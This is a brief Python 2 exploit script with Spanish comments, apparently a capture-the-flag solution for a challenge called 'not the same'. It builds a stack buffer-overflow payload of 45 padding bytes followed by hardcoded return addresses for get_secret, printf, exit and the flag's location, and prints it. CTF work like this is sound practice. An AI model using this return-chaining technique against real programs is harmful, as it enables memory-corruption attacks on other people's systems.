#!/usr/bin/env python
# Archivo pwn_not_the_same.py

buf='A'*45
# get_secret
retn1 = "\xa0\x89\x04\x08"
# printf
retn2 = "\xa0\xf0\x04\x08"
# exit
retn3 = "\x60\xe6\x04\x08"
# fl4g posicion
retn4 = "\x2d\xca\x0e\x08"

print buf+retn1+retn2+retn3+retn4

# Fin fichero pwn_not_the_same
